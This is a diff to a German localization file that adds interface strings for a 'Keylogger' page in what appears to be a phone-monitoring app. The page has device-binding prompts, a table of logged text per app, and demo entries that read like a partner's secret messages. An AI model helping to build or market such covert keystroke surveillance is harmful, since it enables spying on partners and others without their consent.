@@ -832,5 +832,37 @@
       "title": "Standortkarte",
       "selected_location": "Ausgewählter Standort"
     }
+  },
+  "dkl": {
+    "header": {
+      "title": "Keylogger",
+      "demo_message": "Demodaten. Binden Sie Ihr Gerät, um echte Daten zu sammeln.",
+      "bind_button": "Mein Gerät binden",
+      "bind_button_aria": "Gerät binden, um mit der Datensammlung zu beginnen"
+    },
+    "dropdown": {
+      "label": "Apps"
+    },
+    "table": {
+      "app_name": "App-Name",
+      "logged_text": "Aufgezeichneter Text",
+      "time": "Zeit",
+      "no_activity": "Keine kürzliche Aktivität"
+    },
+    "pagination": {
+      "prev_button_aria": "Vorherige Seite",
+      "next_button_aria": "Nächste Seite"
+    },
+    "logs": [
+      { "text": "Wie verstecke ich Nachrichten auf dem Handy?" },
+      { "text": "Treff mich heute Abend, sag es niemandem." },
+      { "text": "Ich habe gesagt, ich arbeite bis spät." },
+      { "text": "Wie lösche ich den Chatverlauf?" },
+      { "text": "Kannst du mich morgen decken?" },
+      { "text": "Lass uns am üblichen Ort treffen." },
+      { "text": "Ich kann nicht zulassen, dass sie es herausfinden." },
+      { "text": "Lösche dies nach dem Lesen." },
+      { "text": "Wie lösche ich den Browserverlauf?" }
+    ]
   }
 }
